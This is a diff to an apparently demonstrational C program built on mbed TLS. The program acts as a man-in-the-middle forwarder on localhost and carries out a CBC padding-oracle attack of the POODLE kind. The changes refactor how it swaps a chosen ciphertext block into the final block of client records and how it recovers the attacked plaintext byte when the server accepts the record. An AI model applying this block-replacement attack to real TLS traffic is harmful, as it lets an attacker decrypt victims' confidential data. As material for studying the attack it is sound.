@@ -80,6 +80,11 @@ int main( void )
 #define LISTEN_ADDR         "localhost"
 #define LISTEN_PORT         "4433"
 
+#define PT_LEN     128  /* Length of interesting plaintext (inc. mac + padding) */
+#define BLOCK_OFF   48  /* Offset of interesting block within plaintext */
+#define BLOCK_LEN   16  /* Size of an AES block */
+#define HDR_LEN      5  /* Lenght of SSL record header */
+
 enum direction {
     c2s,
     s2c
@@ -93,7 +98,6 @@ int forward( mbedtls_net_context *from,
              enum direction dir )
 {
     unsigned char buf[MAX_MSG_SIZE];
-    unsigned char *rec;
     int ret;
     size_t len;
 
@@ -106,36 +110,27 @@ int forward( mbedtls_net_context *from,
     len = (size_t) ret;
     printf( "forwarding %d bytes (%s)\n", ret, dir == c2s ? "c2s" : "s2c" );
 
-    if( dir == c2s && len == 170 )
-        rec = buf + 37;
-    else
-        rec = buf;
-
     /*
      * Only alter record from client to server that are AppData,
      * skipping 1-byte records from 1/n-1 splitting.
-     *
-     * We know the interesting records are exactly 128 + 5 bytes,
-     * so check for that.
      */
     if( dir == c2s &&
-        ( len == 133 || len == 170 ) &&
-        rec[0] == MBEDTLS_SSL_MSG_APPLICATION_DATA )
+        len >= HDR_LEN + PT_LEN &&
+        buf[0] == MBEDTLS_SSL_MSG_APPLICATION_DATA )
     {
-        unsigned char value;
+        /* Skip header */
+        unsigned char *rec = buf + HDR_LEN;
 
-        /*
-         * The byte under attack is byte 63 of the plaintext
-         * so the interesting block starts at byte 48 + 5 in the record.
-         */
-        memcpy( buf + 112 + 5, buf + 48 + 5, 16 );
+        /* Sometimes we get two records at once, skip the first one */
+        if( len == HDR_LEN + 2 * BLOCK_LEN + HDR_LEN + PT_LEN )
+            rec += HDR_LEN + 2 * BLOCK_LEN;
 
-        /*
-         * If that message is accepted, it means the byte under attack is 0x0f
-         * xor the last bytes of the previous and last-but-one blocks
-         */
-        value = buf[5 + 112 - 1] ^ 0x0f ^ buf[5 + 48 - 1];
-        fprintf( stderr, "0x%0x\n", value );
+        /* Replace last block with the block of interest */
+        memcpy( rec + PT_LEN - BLOCK_LEN, rec + BLOCK_OFF, BLOCK_LEN );
+
+        /* Value of the attacked byte if the message is accepted */
+        unsigned char value = rec[PT_LEN - BLOCK_LEN - 1] ^ 0x0f ^ rec[BLOCK_OFF - 1];
+        fprintf( stderr, "0x%02x\n", value );
         fflush( stderr );
     }
 
